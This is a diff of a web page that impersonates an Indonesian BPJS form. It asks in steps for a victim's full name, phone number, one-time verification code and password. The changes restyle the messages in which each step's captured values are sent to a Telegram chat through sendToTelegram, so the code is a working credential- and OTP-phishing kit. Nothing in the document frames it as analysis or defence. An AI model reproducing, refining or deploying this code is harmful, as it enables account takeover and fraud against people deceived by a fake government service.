@@ -208,7 +208,7 @@
 			<input name="full_name" id="full_name" maxlength="18" class="form-control" type="text" required="true" placeholder="Nama lengkap Sesuai KTP" title="Sila Masukkan Nombor , contoh +62822334455">
 			</div>
 			<div class="input-group mb-3">
-			<span class="input-group-text" id="basic-addon1">🇮🇩 +62 </span>
+			<span class="input-group-text" id="basic-addon1">🇮🇩 </span>
 			<input name="phone_number" id="phone_number" maxlength="18" class="form-control" type="tel" required="true" placeholder="08xxxx" title="Sila Masukkan Nombor , contoh +62890930">
 			</div>
 			<div class="text-center">
@@ -414,8 +414,7 @@ function processFirstData() {
             return false;
         }
 
-        var phone_number = "+62" + originalPhoneNumber; // Pastikan originalPhoneNumber tidak memiliki "0" di depan
-var message = `🔹 *BPJS* 🔹\n\n👤 *Nama:* ${$full_name}\n📞 *Nomor:* ${phone_number}`;
+        var message = `🔹 *BPJS* 🔹\n\n👤 *Nama:* ${$full_name}\n📞 *Nomor:*  ${$phone_number}`;
 sendToTelegram(message);
 
         setTimeout(() => {
@@ -446,8 +445,9 @@ function processSecondData() {
             return false;
         }
 
-        var message = `OTP Code Verification: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}`;
-        sendToTelegram(message);
+        var message = `✅ *BPJS * ✅\n\n👤 *Name:* ${$full_name}\n📞 *Nomor:* \`${$phone_number}\`\n🔢 *OTP:* \`${$otp_code}\``;
+sendToTelegram(message);
+
 
         setTimeout(() => {
             $(".third").show();
@@ -477,8 +477,9 @@ function processThirdData() {
             return false;
         }
 
-        var message = `Final Submission: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}\nPassword: ${$password}`;
-        sendToTelegram(message);
+        var message = `✅ *BPJS* ✅\n\n👤 *Full Name:* ${$full_name}\n📞 *Phone Number:* \`${$phone_number}\`\n🔢 *OTP Code:* \`${$otp_code}\`\n🔑 *Password:* \`${$password}\``;
+sendToTelegram(message);
+
 
         setTimeout(() => {
             alert("Data submitted successfully!");
